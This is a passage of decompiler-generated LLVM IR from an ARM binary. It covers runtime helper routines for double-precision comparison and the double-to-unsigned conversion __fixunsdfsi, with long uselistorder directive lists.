  br i1 %v3_1aaf8, label %.thread3, label %bb16

.thread3:                                         ; preds = %bb15, %..thread3_crit_edge
  %v4_1aafc.pre-phi = phi i32 [ %.pre8, %..thread3_crit_edge ], [ %v4_1aaf8, %bb15 ]
  %v5_1aafc = sub nsw i32 -1, %v4_1aafc.pre-phi
  br label %bb16

bb16:                                             ; preds = %bb15, %.thread3
  %v0_1ab00 = phi i32 [ %v4_1aaf8, %bb15 ], [ %v5_1aafc, %.thread3 ]
  %v1_1ab00 = or i32 %v0_1ab00, 1
  ret i32 %v1_1ab00

dec_label_pc_1ab08:                               ; preds = %bb
  br label %dec_label_pc_1ab1c

dec_label_pc_1ab14:                               ; preds = %dec_label_pc_1aab8
  %v0_1ab14 = load i32, i32* @r0, align 4
  %v4_1ab14 = mul i32 %v0_1aabc, 4096
  %v5_1ab14 = or i32 %v0_1ab14, %v4_1ab14
  %v7_1ab14 = icmp eq i32 %v5_1ab14, 0
  br i1 %v7_1ab14, label %dec_label_pc_1ab14.dec_label_pc_1ab1c_crit_edge, label %dec_label_pc_1ab30

dec_label_pc_1ab14.dec_label_pc_1ab1c_crit_edge:  ; preds = %dec_label_pc_1ab14
  %v2_1aac4.off20 = add i32 %v2_1aac4, 4194303
  %tmp22 = icmp ult i32 %v2_1aac4.off20, 2097152
  br label %dec_label_pc_1ab1c

dec_label_pc_1ab1c:                               ; preds = %dec_label_pc_1ab14.dec_label_pc_1ab1c_crit_edge, %dec_label_pc_1ab08
  %v3_1ab20.pre-phi = phi i1 [ %tmp22, %dec_label_pc_1ab14.dec_label_pc_1ab1c_crit_edge ], [ true, %dec_label_pc_1ab08 ]
  br i1 %v3_1ab20.pre-phi, label %dec_label_pc_1ab28, label %dec_label_pc_1aad0

dec_label_pc_1ab28:                               ; preds = %dec_label_pc_1ab1c
  %v0_1ab28 = load i32, i32* @r2, align 4
  %v4_1ab28 = mul i32 %v0_1aac4, 4096
  %v5_1ab28 = or i32 %v0_1ab28, %v4_1ab28
  %v7_1ab28 = icmp eq i32 %v5_1ab28, 0
  br i1 %v7_1ab28, label %dec_label_pc_1aad0, label %dec_label_pc_1ab30

dec_label_pc_1ab30:                               ; preds = %dec_label_pc_1ab14, %dec_label_pc_1ab28
  ret i32 %v0_1aab8

; uselistorder directives
  uselistorder i32 %v4_1aaf8, { 1, 0 }
  uselistorder i32 %v1_1aaec, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_1aaec, { 2, 1, 0 }
  uselistorder i32 %v1_1aad4, { 1, 0 }
  uselistorder i32 %v2_1aac4, { 0, 2, 1 }
  uselistorder i32 %v0_1aac4, { 1, 0, 2 }
  uselistorder i32 %v2_1aabc, { 1, 0 }
  uselistorder i32 %v0_1aabc, { 1, 0, 2 }
  uselistorder i32 1073741824, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 31, { 10, 4, 2, 5, 6, 11, 3, 18, 12, 7, 8, 1, 13, 0, 14, 15, 16, 17, 9 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 7, 5, 6, 8, 9, 10, 11, 33, 34, 35, 36, 37, 38, 39, 40, 41, 46, 47, 48, 49, 50, 58, 59, 60, 42, 12, 18, 65, 56, 43, 45, 70, 75, 73, 74, 72, 66, 67, 0, 14, 15, 68, 69, 71, 62, 63, 54, 16, 57, 17, 44, 1, 55, 13, 51, 52, 53, 61, 64, 2, 3, 4 }
  uselistorder i32* @r3, { 26, 27, 17, 18, 28, 29, 7, 30, 31, 32, 33, 50, 51, 52, 53, 54, 55, 56, 57, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 83, 2, 82, 6, 19, 21, 22, 84, 85, 104, 105, 3, 106, 107, 108, 4, 109, 110, 111, 5, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 0, 130, 131, 132, 133, 34, 35, 93, 94, 95, 36, 37, 38, 39, 40, 41, 20, 134, 140, 141, 142, 138, 58, 59, 60, 97, 98, 9, 96, 61, 42, 43, 99, 100, 101, 102, 103, 10, 11, 12, 146, 143, 144, 145, 1, 147, 148, 149, 44, 45, 65, 23, 66, 67, 68, 69, 46, 47, 70, 139, 62, 63, 64, 135, 136, 137, 24, 25, 48, 49, 13, 14, 15, 16, 86, 87, 88, 89, 90, 91, 92, 8 }
  uselistorder i32* @r1, { 65, 66, 12, 67, 68, 69, 70, 71, 13, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 29, 30, 14, 31, 32, 83, 1, 84, 85, 86, 87, 88, 89, 90, 11, 91, 92, 93, 94, 119, 15, 120, 121, 122, 125, 16, 17, 126, 127, 128, 129, 130, 131, 134, 135, 136, 137, 138, 141, 149, 150, 151, 152, 155, 156, 157, 8, 33, 34, 158, 159, 142, 95, 35, 37, 160, 161, 167, 168, 123, 58, 143, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 19, 124, 0, 36, 38, 20, 28, 182, 183, 132, 133, 2, 139, 140, 3, 4, 178, 39, 21, 169, 170, 27, 177, 5, 174, 175, 176, 144, 145, 146, 107, 108, 109, 22, 23, 162, 163, 164, 165, 166, 6, 153, 154, 9, 173, 24, 18, 7, 110, 111, 112, 10, 113, 114, 115, 25, 147, 148, 116, 117, 179, 180, 26, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 59, 60, 61, 62, 63, 64, 118, 171, 172, 181 }
  uselistorder i32* @ip, { 26, 18, 19, 20, 27, 28, 29, 30, 31, 32, 33, 68, 69, 70, 71, 72, 78, 79, 81, 82, 83, 84, 85, 86, 87, 88, 96, 1, 104, 103, 15, 113, 114, 115, 116, 117, 118, 119, 120, 121, 123, 124, 122, 125, 10, 126, 11, 127, 128, 129, 130, 34, 35, 2, 36, 21, 80, 131, 132, 133, 147, 75, 76, 14, 38, 37, 6, 39, 40, 7, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 12, 186, 187, 188, 189, 190, 191, 192, 193, 194, 77, 41, 42, 43, 44, 45, 195, 16, 89, 90, 3, 91, 92, 93, 94, 95, 149, 13, 97, 98, 99, 100, 101, 102, 150, 151, 148, 108, 109, 46, 73, 74, 152, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 48, 47, 8, 199, 196, 197, 198, 9, 200, 105, 0, 23, 106, 4, 107, 24, 5, 25, 50, 51, 52, 53, 54, 55, 56, 57, 49, 58, 59, 60, 61, 62, 63, 64, 65, 22, 110, 111, 112, 66, 67, 17 }
  uselistorder label %dec_label_pc_1ab30, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %..thread3_crit_edge, { 1, 0, 2 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_1aad0, { 1, 0, 2 }
}

define i32 @__aeabi_cdrcmple() local_unnamed_addr {
entry:
  %v0_1ab38 = load i32, i32* @r0, align 4
  %v0_1ab3c = load i32, i32* @r2, align 4
  store i32 %v0_1ab3c, i32* @r0, align 4
  store i32 %v0_1ab38, i32* @r2, align 4
  %v0_1ab50 = call i32 @__aeabi_cdcmple()
  ret i32 %v0_1ab50
}

define i32 @__aeabi_cdcmple() local_unnamed_addr {
entry:
  %v3_1ab54 = load i32, i32* @r0, align 4
  %v1_1ab58 = sext i32 %v3_1ab54 to i64
  %v2_1ab58 = bitcast i64 %v1_1ab58 to double
  %v3_1ab58 = load i32, i32* @r2, align 4
  %v4_1ab58 = sext i32 %v3_1ab58 to i64
  %v5_1ab58 = bitcast i64 %v4_1ab58 to double
  %v7_1ab58 = fcmp oeq double %v2_1ab58, %v5_1ab58
  store i1 true, i1* @cpsr_c, align 1
  %not.v6_1ab58 = fcmp ule double %v2_1ab58, %v5_1ab58
  %not.v7_1ab58 = xor i1 %v7_1ab58, true
  %v1_1ab5c = and i1 %not.v6_1ab58, %not.v7_1ab58
  store i1 %v7_1ab58, i1* @cpsr_z, align 1
  br i1 %v1_1ab5c, label %bb, label %bb3

bb:                                               ; preds = %entry
  store i1 false, i1* @cpsr_c, align 1
  store i1 %v7_1ab58, i1* @cpsr_z, align 1
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  ret i32 %v3_1ab54

; uselistorder directives
  uselistorder i1 %v7_1ab58, { 1, 2, 0 }
  uselistorder i32* @r2, { 13, 32, 33, 34, 35, 2, 36, 37, 38, 39, 40, 41, 10, 42, 81, 82, 86, 11, 88, 89, 90, 91, 92, 97, 103, 104, 105, 106, 107, 108, 16, 109, 110, 111, 43, 44, 19, 87, 17, 18, 85, 112, 113, 114, 12, 27, 9, 126, 127, 128, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 121, 55, 56, 57, 58, 83, 84, 129, 133, 134, 135, 136, 1, 139, 93, 94, 3, 130, 4, 5, 95, 96, 6, 7, 122, 98, 59, 60, 61, 62, 28, 74, 0, 137, 8, 138, 63, 64, 65, 67, 66, 68, 69, 70, 71, 99, 100, 101, 72, 73, 102, 131, 132, 20, 21, 22, 23, 24, 25, 26, 29, 30, 31, 75, 76, 14, 15, 77, 78, 79, 80, 115, 116, 117, 118, 119, 120, 123, 124, 125 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dcmpeq(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v0_1ab70 = call i32 @__aeabi_cdcmple()
  %v0_1ab74 = load i1, i1* @cpsr_z, align 1
  %.v0_1ab70. = zext i1 %v0_1ab74 to i32
  ret i32 %.v0_1ab70.
}

define i32 @__aeabi_dcmplt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_1ab88 = call i32 @__aeabi_cdcmple()
  %v0_1ab8c = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_1ab8c to i32
  %.v0_1ab88. = xor i32 %tmp2, 1
  ret i32 %.v0_1ab88.
}

define i32 @__aeabi_dcmple() local_unnamed_addr {
entry:
  %v0_1aba0 = call i32 @__aeabi_cdcmple()
  %v0_1aba4 = load i1, i1* @cpsr_z, align 1
  %v1_1aba4 = load i1, i1* @cpsr_c, align 1
  %v2_1aba4 = xor i1 %v1_1aba4, true
  %v3_1aba4 = or i1 %v0_1aba4, %v2_1aba4
  %.v0_1aba0 = select i1 %v3_1aba4, i32 1, i32 %v0_1aba0
  %v2_1aba8 = xor i1 %v0_1aba4, true
  %v3_1aba8 = and i1 %v1_1aba4, %v2_1aba8
  %..v0_1aba0 = select i1 %v3_1aba8, i32 0, i32 %.v0_1aba0
  ret i32 %..v0_1aba0

; uselistorder directives
  uselistorder i1 %v1_1aba4, { 1, 0 }
  uselistorder i32 ()* @__aeabi_cdcmple, { 2, 1, 0, 3 }
}

define i32 @__aeabi_dcmpge(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_1abb4 = load i32, i32* @lr, align 4
  store i32 %v0_1abb4, i32* %stack_var_-8, align 4
  %v0_1abb8 = call i32 @__aeabi_cdrcmple()
  %v0_1abbc = load i1, i1* @cpsr_z, align 1
  %v1_1abbc = load i1, i1* @cpsr_c, align 1
  %v2_1abbc = xor i1 %v1_1abbc, true
  %v3_1abbc = or i1 %v0_1abbc, %v2_1abbc
  %.v0_1abb8 = select i1 %v3_1abbc, i32 1, i32 %v0_1abb8
  %v2_1abc0 = xor i1 %v0_1abbc, true
  %v3_1abc0 = and i1 %v1_1abbc, %v2_1abc0
  %..v0_1abb8 = select i1 %v3_1abc0, i32 0, i32 %.v0_1abb8
  %v2_1abc4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1abc4, i32* @lr, align 4
  ret i32 %..v0_1abb8

; uselistorder directives
  uselistorder i1 %v1_1abbc, { 1, 0 }
  uselistorder i1 true, { 3, 4, 5, 6, 0, 102, 1, 93, 7, 8, 9, 10, 11, 12, 85, 86, 94, 95, 87, 13, 14, 15, 88, 89, 90, 96, 16, 17, 18, 19, 22, 21, 20, 104, 105, 106, 107, 108, 109, 110, 91, 111, 112, 113, 98, 114, 115, 116, 117, 92, 118, 119, 120, 121, 122, 123, 124, 23, 125, 103, 126, 24, 25, 26, 27, 99, 30, 31, 32, 33, 28, 29, 100, 34, 101, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 97, 127, 64, 65, 66, 67, 2, 68, 69, 83, 70, 71, 72, 73, 84, 74, 75, 76, 77, 78, 79, 80, 81, 82 }
  uselistorder i1* @cpsr_z, { 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 0, 1, 2, 3, 4, 5, 6, 7, 8, 45, 9, 10, 11, 12, 13, 14, 15, 16, 41, 42, 43, 44, 17, 18, 19, 20, 40, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* @lr, { 24, 25, 26, 27, 28, 9, 10, 11, 12, 13, 29, 0, 30, 1, 31, 32, 33, 57, 58, 62, 63, 64, 68, 69, 70, 71, 72, 73, 74, 75, 78, 88, 89, 82, 5, 90, 91, 92, 93, 94, 95, 96, 97, 14, 98, 99, 100, 108, 101, 102, 103, 104, 105, 106, 107, 34, 65, 66, 67, 23, 136, 137, 138, 139, 140, 141, 142, 143, 144, 83, 84, 59, 60, 61, 35, 36, 37, 38, 39, 40, 41, 42, 43, 56, 15, 16, 115, 116, 117, 18, 19, 145, 54, 55, 111, 146, 147, 118, 119, 120, 121, 122, 79, 80, 81, 123, 124, 125, 126, 127, 128, 129, 2, 130, 131, 133, 134, 132, 109, 110, 20, 21, 22, 85, 86, 87, 44, 45, 46, 47, 48, 49, 3, 4, 50, 51, 52, 53, 17, 76, 77, 114, 135, 6, 7, 8, 112, 113 }
}

define i32 @__aeabi_dcmpgt() local_unnamed_addr {
entry:
  %v0_1abd0 = call i32 @__aeabi_cdrcmple()
  %v0_1abd4 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_1abd4 to i32
  %.v0_1abd0. = xor i32 %tmp2, 1
  ret i32 %.v0_1abd0.

; uselistorder directives
  uselistorder i32 1, { 580, 593, 688, 594, 581, 1061, 1006, 1062, 689, 350, 353, 352, 356, 355, 351, 357, 354, 1063, 690, 1064, 691, 38, 40, 36, 37, 39, 412, 131, 130, 551, 191, 692, 413, 414, 1065, 1066, 359, 358, 1067, 502, 503, 504, 693, 108, 109, 104, 105, 106, 107, 1127, 506, 1128, 1134, 604, 1135, 1136, 694, 80, 81, 82, 79, 85, 83, 84, 695, 336, 335, 1137, 605, 606, 1140, 1154, 698, 697, 696, 417, 416, 418, 415, 1156, 699, 10, 11, 1157, 552, 1158, 1159, 700, 132, 133, 1160, 701, 378, 78, 77, 76, 1161, 703, 702, 75, 74, 73, 704, 72, 607, 1162, 1163, 1164, 523, 1165, 587, 553, 1166, 1167, 526, 1168, 1169, 707, 706, 705, 421, 420, 422, 419, 708, 425, 424, 423, 1170, 1171, 1172, 1181, 1182, 1183, 1190, 608, 609, 717, 716, 715, 714, 687, 713, 712, 711, 710, 709, 427, 430, 428, 429, 431, 426, 1193, 718, 63, 61, 62, 64, 719, 582, 1218, 1219, 575, 1220, 1222, 507, 1223, 611, 571, 570, 610, 1224, 518, 535, 568, 588, 1225, 1226, 1227, 1228, 1229, 0, 1232, 1221, 612, 1233, 577, 727, 678, 726, 725, 724, 723, 722, 721, 720, 103, 102, 100, 101, 1234, 1235, 1236, 1237, 1238, 508, 1239, 728, 250, 247, 249, 245, 244, 246, 251, 248, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 554, 1015, 1016, 732, 731, 730, 729, 305, 306, 307, 308, 1017, 1018, 1019, 1020, 1021, 735, 734, 733, 262, 257, 261, 264, 260, 259, 258, 256, 265, 263, 555, 1240, 556, 1241, 1242, 1243, 1244, 1, 1245, 1246, 1247, 1248, 1249, 1250, 737, 736, 160, 159, 162, 163, 158, 164, 161, 595, 1251, 1252, 1253, 1254, 1255, 738, 313, 312, 314, 316, 315, 1194, 739, 432, 433, 434, 740, 309, 741, 165, 167, 166, 168, 742, 145, 144, 146, 1068, 1069, 1070, 743, 437, 439, 438, 435, 436, 744, 139, 140, 137, 143, 141, 138, 142, 233, 238, 232, 237, 241, 240, 236, 239, 234, 235, 745, 393, 392, 390, 389, 391, 387, 388, 746, 147, 148, 155, 156, 152, 153, 151, 154, 149, 150, 440, 295, 294, 320, 319, 557, 1256, 1257, 1276, 1277, 748, 747, 323, 325, 326, 324, 527, 576, 528, 1314, 1315, 1316, 1317, 558, 749, 327, 1049, 1050, 342, 343, 536, 1141, 1383, 1142, 1143, 1144, 537, 1051, 1146, 1145, 514, 750, 1052, 751, 442, 443, 444, 441, 1071, 538, 1072, 1385, 539, 1386, 1387, 1388, 1389, 1390, 1391, 991, 1392, 1393, 1394, 1395, 1396, 1397, 992, 679, 753, 752, 111, 112, 117, 119, 118, 113, 110, 114, 116, 115, 613, 1195, 1196, 1202, 1203, 754, 680, 135, 136, 1147, 1148, 755, 297, 296, 540, 559, 1073, 1074, 1075, 614, 1076, 524, 560, 519, 541, 1077, 615, 1078, 1079, 1080, 2, 1081, 512, 1082, 509, 1083, 616, 1084, 1085, 1086, 561, 1087, 768, 767, 766, 765, 764, 763, 762, 761, 760, 759, 758, 757, 681, 756, 13, 23, 12, 14, 20, 17, 15, 18, 16, 24, 26, 21, 19, 22, 25, 1301, 1302, 381, 379, 384, 386, 382, 383, 380, 385, 157, 520, 769, 97, 98, 770, 99, 1197, 1198, 1199, 771, 45, 47, 46, 48, 42, 41, 43, 44, 1088, 773, 772, 27, 29, 28, 30, 32, 31, 562, 589, 776, 775, 774, 617, 1155, 777, 293, 1149, 1150, 1151, 1152, 1153, 618, 778, 121, 124, 122, 123, 125, 619, 184, 1022, 779, 67, 620, 780, 346, 621, 781, 202, 200, 201, 782, 291, 290, 289, 783, 204, 203, 194, 784, 71, 785, 377, 376, 786, 70, 68, 69, 787, 66, 788, 229, 228, 789, 445, 790, 446, 791, 329, 792, 793, 189, 190, 1398, 622, 1399, 1400, 623, 1401, 794, 177, 173, 178, 176, 174, 179, 181, 180, 175, 230, 624, 345, 344, 182, 795, 447, 448, 449, 183, 796, 1327, 1328, 799, 798, 797, 242, 253, 521, 1003, 1004, 1005, 800, 1026, 803, 802, 801, 292, 804, 529, 1176, 530, 1177, 1178, 522, 1179, 451, 452, 450, 453, 455, 454, 456, 1180, 531, 1023, 330, 333, 332, 331, 334, 1129, 563, 1130, 806, 805, 89, 87, 86, 93, 91, 92, 90, 88, 807, 399, 401, 397, 395, 396, 398, 400, 808, 402, 407, 403, 406, 405, 408, 404, 809, 810, 1402, 564, 625, 812, 811, 813, 1331, 1334, 1335, 1336, 814, 457, 462, 463, 461, 460, 464, 458, 459, 1337, 1338, 1339, 1340, 815, 469, 475, 468, 474, 473, 467, 477, 476, 471, 465, 470, 466, 472, 1332, 1333, 626, 816, 219, 221, 220, 1184, 627, 1185, 1186, 1187, 1188, 1189, 817, 52, 53, 51, 54, 1341, 1342, 1343, 1344, 1345, 1346, 583, 1347, 1348, 1349, 1350, 1351, 1352, 1353, 1354, 629, 1355, 1356, 1357, 1358, 1359, 628, 1360, 1361, 1362, 1363, 1364, 818, 207, 209, 205, 208, 213, 216, 212, 214, 215, 210, 211, 206, 361, 360, 630, 631, 1027, 525, 822, 821, 820, 819, 267, 55, 542, 266, 823, 410, 409, 269, 824, 270, 825, 328, 826, 268, 287, 827, 272, 271, 828, 288, 829, 830, 1303, 1304, 832, 831, 478, 479, 1209, 833, 1294, 1295, 3, 120, 1089, 1090, 834, 480, 1138, 1139, 543, 1384, 1258, 1259, 1260, 1261, 1262, 1263, 1264, 1265, 1266, 1267, 1268, 1269, 1270, 1271, 1272, 1273, 1274, 1275, 835, 275, 273, 274, 276, 277, 1230, 1231, 49, 50, 544, 1091, 1279, 1280, 1281, 1282, 1283, 1284, 1285, 33, 1192, 1191, 993, 994, 995, 996, 997, 998, 999, 1403, 57, 58, 59, 60, 56, 632, 836, 1207, 1204, 1205, 1206, 572, 545, 199, 195, 196, 197, 198, 1201, 837, 337, 339, 340, 341, 338, 633, 1200, 839, 838, 484, 482, 485, 481, 483, 486, 1028, 840, 373, 1208, 841, 225, 224, 223, 1029, 842, 171, 170, 172, 169, 578, 1092, 1093, 635, 1094, 1095, 1096, 1097, 1098, 636, 1099, 1100, 1101, 1102, 1103, 637, 1105, 566, 565, 1104, 634, 1106, 1107, 638, 1108, 1109, 1110, 847, 682, 846, 845, 844, 843, 366, 364, 365, 369, 362, 363, 370, 371, 367, 372, 368, 1111, 848, 488, 492, 490, 491, 487, 489, 546, 849, 286, 285, 1112, 1113, 1114, 187, 188, 185, 186, 579, 513, 1116, 1117, 532, 1118, 1119, 4, 5, 1120, 1122, 515, 1123, 640, 1124, 533, 1121, 639, 859, 858, 857, 856, 855, 854, 853, 852, 851, 850, 127, 129, 128, 641, 547, 860, 94, 95, 96, 1115, 590, 683, 861, 493, 1024, 862, 280, 279, 281, 284, 282, 278, 283, 642, 1025, 1210, 1211, 1212, 1213, 1214, 1215, 1216, 1217, 548, 865, 864, 863, 495, 494, 498, 497, 496, 499, 567, 867, 866, 868, 1173, 1174, 1175, 870, 869, 34, 35, 871, 318, 317, 872, 321, 411, 873, 301, 874, 500, 875, 311, 310, 227, 226, 375, 374, 876, 218, 217, 877, 322, 878, 879, 255, 254, 880, 394, 243, 881, 501, 231, 882, 883, 304, 303, 884, 134, 885, 348, 347, 510, 1365, 299, 298, 1030, 516, 534, 1031, 1032, 1033, 511, 645, 1034, 1035, 1036, 584, 1037, 1038, 1039, 1040, 1041, 643, 644, 585, 646, 1042, 892, 891, 890, 889, 888, 887, 886, 1043, 1044, 899, 898, 897, 896, 895, 684, 894, 893, 647, 1045, 1046, 901, 900, 1047, 1048, 648, 649, 902, 1053, 1054, 650, 908, 907, 906, 905, 904, 903, 252, 1055, 1056, 651, 1057, 1058, 1059, 1060, 914, 913, 912, 911, 910, 909, 302, 1125, 918, 917, 916, 915, 1126, 923, 922, 921, 920, 919, 1131, 652, 1000, 1001, 655, 1002, 653, 654, 990, 1132, 1133, 932, 931, 930, 929, 928, 927, 926, 925, 924, 193, 192, 656, 657, 658, 936, 935, 934, 933, 596, 1278, 937, 940, 939, 938, 6, 659, 573, 942, 941, 591, 1286, 660, 661, 1288, 1287, 662, 945, 944, 943, 597, 1289, 1290, 663, 664, 665, 1296, 685, 1291, 666, 946, 592, 667, 668, 1292, 669, 1293, 954, 953, 952, 951, 950, 949, 948, 947, 598, 1297, 1298, 599, 955, 956, 1299, 670, 1300, 959, 958, 957, 961, 960, 962, 569, 1305, 1306, 1307, 671, 517, 1308, 1309, 1310, 672, 1311, 965, 964, 963, 686, 1312, 222, 1313, 65, 601, 1318, 1319, 600, 1320, 1321, 602, 603, 1322, 1323, 966, 1324, 7, 8, 1326, 1325, 673, 969, 968, 967, 674, 1329, 1330, 971, 970, 974, 973, 972, 977, 976, 975, 979, 978, 1366, 1367, 675, 1376, 1377, 574, 1378, 981, 980, 586, 9, 985, 984, 983, 982, 550, 1368, 1369, 1370, 549, 1371, 1374, 1375, 676, 986, 677, 1372, 1373, 987, 349, 1379, 1380, 126, 1381, 1382, 300, 988, 989, 505 }
  uselistorder i1 false, { 37, 13, 14, 11, 15, 50, 51, 52, 53, 54, 55, 8, 9, 12, 56, 57, 58, 10, 38, 35, 39, 40, 41, 42, 43, 3, 16, 17, 36, 1, 30, 59, 0, 21, 22, 23, 44, 18, 20, 45, 46, 47, 48, 49, 32, 2, 5, 60, 19, 24, 27, 26, 25, 28, 6, 7, 29, 4, 34, 31, 33, 61, 62, 63, 64 }
  uselistorder i1* @cpsr_c, { 1, 3, 2, 4, 5, 6, 0 }
  uselistorder i32 ()* @__aeabi_cdrcmple, { 1, 0 }
}

define i32 @__fixunsdfsi(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1abe4 = icmp slt i32 %arg2, 0
  %v2_1abe4 = mul i32 %arg2, 2
  br i1 %v1_1abe4, label %dec_label_pc_1ac18, label %dec_label_pc_1abec

dec_label_pc_1abec:                               ; preds = %entry
  %v1_1abec = add i32 %v2_1abe4, 2097152
  %v2_1abec = icmp ugt i32 %v2_1abe4, -2097153
  br i1 %v2_1abec, label %dec_label_pc_1ac20, label %dec_label_pc_1abf4

dec_label_pc_1abf4:                               ; preds = %dec_label_pc_1abec
  %v6_1abec = icmp slt i32 %v1_1abec, 0
  br i1 %v6_1abec, label %dec_label_pc_1abf8, label %dec_label_pc_1ac18

dec_label_pc_1abf8:                               ; preds = %dec_label_pc_1abf4
  %v4_1abfc = sdiv i32 %v1_1abec, 2097152
  %v5_1abfc = sub nsw i32 -993, %v4_1abfc
  %v11_1abfc = icmp slt i32 %v5_1abfc, 0
  br i1 %v11_1abfc, label %dec_label_pc_1ac28, label %dec_label_pc_1ac04

dec_label_pc_1ac04:                               ; preds = %dec_label_pc_1abf8
  %v3_1ac04 = mul i32 %arg2, 2048
  %v4_1ac0c = udiv i32 %arg1, 2097152
  %v1_1ac08 = or i32 %v4_1ac0c, %v3_1ac04
  %v5_1ac0c = or i32 %v1_1ac08, -2147483648
  %v6_1ac10 = lshr i32 %v5_1ac0c, %v5_1abfc
  ret i32 %v6_1ac10

dec_label_pc_1ac18:                               ; preds = %dec_label_pc_1abf4, %entry
  ret i32 0

dec_label_pc_1ac20:                               ; preds = %dec_label_pc_1abec
  %v4_1ac20 = mul i32 %arg2, 4096
  %v5_1ac20 = or i32 %v4_1ac20, %arg1
  %v7_1ac20 = icmp eq i32 %v5_1ac20, 0
  br i1 %v7_1ac20, label %dec_label_pc_1ac28, label %dec_label_pc_1ac30

dec_label_pc_1ac28:                               ; preds = %dec_label_pc_1ac20, %dec_label_pc_1abf8
  ret i32 -1

dec_label_pc_1ac30:                               ; preds = %dec_label_pc_1ac20
  ret i32 0

; uselistorder directives
  uselistorder i32 -1, { 0, 44, 278, 185, 186, 47, 48, 45, 46, 187, 49, 1, 188, 189, 190, 191, 2, 192, 193, 3, 4, 194, 86, 195, 87, 327, 167, 329, 88, 330, 149, 297, 331, 332, 5, 89, 333, 334, 196, 197, 146, 198, 155, 90, 6, 199, 343, 76, 77, 344, 200, 150, 201, 152, 202, 7, 203, 154, 153, 345, 346, 66, 67, 68, 69, 71, 78, 8, 9, 74, 279, 10, 11, 12, 92, 96, 91, 93, 143, 144, 97, 95, 94, 168, 280, 98, 337, 99, 298, 204, 299, 300, 281, 282, 283, 100, 284, 285, 347, 348, 205, 50, 51, 301, 206, 84, 52, 207, 302, 53, 13, 54, 208, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 209, 338, 340, 210, 101, 303, 212, 304, 305, 85, 79, 80, 306, 307, 308, 309, 310, 156, 102, 311, 157, 14, 211, 81, 82, 213, 312, 351, 352, 214, 169, 170, 313, 215, 216, 314, 315, 171, 328, 217, 16, 15, 218, 219, 17, 286, 220, 103, 386, 104, 105, 295, 106, 362, 75, 363, 107, 358, 108, 287, 109, 110, 356, 18, 111, 364, 365, 19, 221, 222, 223, 224, 366, 336, 173, 172, 112, 288, 73, 225, 113, 289, 226, 20, 227, 21, 228, 174, 367, 25, 229, 230, 24, 26, 368, 23, 231, 232, 55, 22, 233, 56, 57, 58, 59, 234, 235, 236, 70, 291, 292, 27, 357, 114, 349, 115, 116, 296, 117, 369, 118, 353, 119, 120, 294, 121, 350, 72, 237, 316, 238, 60, 61, 239, 240, 241, 242, 243, 122, 244, 245, 246, 175, 123, 247, 28, 248, 147, 124, 339, 249, 317, 250, 251, 318, 319, 62, 320, 321, 83, 322, 252, 253, 148, 158, 151, 323, 29, 254, 324, 255, 30, 63, 256, 64, 325, 342, 335, 176, 125, 359, 126, 388, 127, 341, 128, 129, 370, 130, 290, 131, 390, 132, 326, 133, 387, 134, 355, 135, 293, 136, 354, 137, 138, 139, 360, 140, 389, 141, 361, 257, 258, 142, 177, 259, 260, 261, 262, 35, 36, 37, 31, 32, 33, 34, 178, 179, 263, 264, 265, 38, 266, 267, 65, 39, 40, 145, 180, 181, 182, 41, 268, 269, 164, 165, 166, 42, 270, 159, 160, 161, 162, 163, 43, 271, 272, 273, 274, 275, 276, 277, 183, 184 }
  uselistorder i32 4096, { 0, 1, 2, 3, 4, 22, 5, 6, 23, 7, 8, 9, 10, 24, 28, 11, 14, 31, 15, 29, 18, 30, 16, 13, 25, 17, 19, 20, 26, 27, 12, 21 }
  uselistorder i32 -2147483648, { 0, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 4, 5, 16, 17, 3, 2, 18, 19, 20, 21 }
  uselistorder i32 2048, { 0, 1, 2, 3, 4, 5, 6, 7, 10, 11, 12, 13, 9, 14, 15, 8 }
  uselistorder i32 2097152, { 8, 9, 15, 0, 1, 2, 10, 11, 3, 4, 5, 12, 13, 14, 6, 7 }
